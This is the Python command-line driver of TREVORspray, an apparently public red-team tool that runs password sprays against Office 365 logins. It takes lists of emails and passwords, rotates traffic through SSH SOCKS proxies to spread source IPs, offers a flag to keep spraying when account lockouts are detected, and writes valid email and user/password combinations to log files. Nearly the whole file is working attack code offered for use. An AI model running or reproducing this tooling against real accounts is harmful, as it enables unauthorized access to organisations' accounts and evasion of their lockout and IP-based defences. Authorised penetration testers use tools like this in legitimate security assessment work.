#!/usr/bin/env python3

# by TheTechromancer

import sys
import time
import logging
import argparse
from lib import util
from lib import logger
from time import sleep
from lib.proxy import *
from lib.errors import *
from shutil import which
from getpass import getpass
from lib.msol import MSOLSpray


log = logging.getLogger('trevorspray.cli')


def main(options):

    valid_emails_file = str(Path(__file__).absolute().parent / 'log' / 'valid_emails.txt')
    tried_logins_file = str(Path(__file__).absolute().parent / 'log' / 'tried_logins.txt')
    valid_logins_file = str(Path(__file__).absolute().parent / 'log' / 'valid_logins.txt')

    load_balancer = SSHLoadBalancer(
        hosts=options.ssh,
        key=options.key,
        key_pass=options.key_pass,
        base_port=options.base_port,
        current_ip=(not options.no_current_ip)
    )

    for password in options.passwords:

        sprayer = MSOLSpray(
            emails=options.emails,
            password=password,
            url=options.url,
            force=options.force,
            load_balancer=load_balancer,
            verbose=options.verbose,
            skip_logins=util.read_file(tried_logins_file)
        )

        try:

            load_balancer.start()

            for proxy in load_balancer.proxies:
                log.debug(f'Proxy: {proxy}')

            log.info(f'Spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
            log.info(f'Command: {" ".join(sys.argv)}')

            for i,result in enumerate(sprayer.spray()):
                print(f'       Sprayed {i+1:,} accounts\r', end='', flush=True)
                if options.verbose and options.delay > 0:
                    log.debug(f'Sleeping for {options.delay:,} seconds')
                sleep(options.delay)

            log.info(f'Finished spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
            for success in sprayer.valid_logins:
                log.critical(success)

        finally:
            load_balancer.stop()
            # write valid emails
            util.update_file(valid_emails_file, sprayer.valid_emails)
            log.debug(f'{len(sprayer.valid_emails):,} valid emails written to {valid_emails_file}')
            # write attempted logins
            util.update_file(tried_logins_file, sprayer.tried_logins)
            # write valid logins
            util.update_file(valid_logins_file, sprayer.valid_logins)
            log.debug(f'{len(sprayer.valid_logins):,} valid user/pass combos written to {valid_logins_file}')




if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Execute password sprays against O365, optionally proxying the traffic through SSH hosts')

    parser.add_argument('-e', '--emails', nargs='+', required=True, help='Emails(s) and/or file(s) filled with emails')
    parser.add_argument('-p', '--passwords', nargs='+', required=True, help='Password(s) that will be used to perform the password spray')
    parser.add_argument('-f', '--force', action='store_true', help='Forces the spray to continue and not stop when multiple account lockouts are detected')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Sleep for this many seconds between requests')
    parser.add_argument('-u', '--url', default='https://login.microsoft.com', help='The URL to spray against (default is https://login.microsoft.com)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show which proxy is being used for each request')
    parser.add_argument('-s', '--ssh', default=[], nargs='+', help='Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used once per round')
    parser.add_argument('-k', '--key', help='Use this SSH key when connecting to proxy hosts')
    parser.add_argument('-kp', '--key-pass', action='store_true', help=argparse.SUPPRESS)
    parser.add_argument('-b', '--base-port', default=33482, type=int, help='Base listening port to use for SOCKS proxies')
    parser.add_argument('-n', '--no-current-ip', action='store_true', help='Don\'t spray from the current IP, only use SSH proxies')

    try:

        options = parser.parse_args()

        if options.no_current_ip and not options.ssh:
            log.error('Cannot specify --no-current-ip without giving --ssh hosts')
            sys.exit(1)

        # make sure executables exist
        for binary in SSHLoadBalancer.dependencies:
            if not which(binary):
                log.error(f'Please install {binary}')
                sys.exit(1)

        if options.ssh and util.ssh_key_encrypted(options.key):
            options.key_pass = getpass('SSH key password (press enter if none): ')

        # handle emails
        options.emails = util.files_to_list(options.emails)

        main(options)


    except argparse.ArgumentError as e:
        log.error(e)
        log.error('Check your syntax')
        sys.exit(2)

    except TREVORSprayError as e:
        if options.verbose:
            import traceback
            log.error(traceback.format_exc())
        else:
            log.error(f'Encountered error (-v to debug): {e}')

    except KeyboardInterrupt:
        log.error('Interrupted')
        sys.exit(1)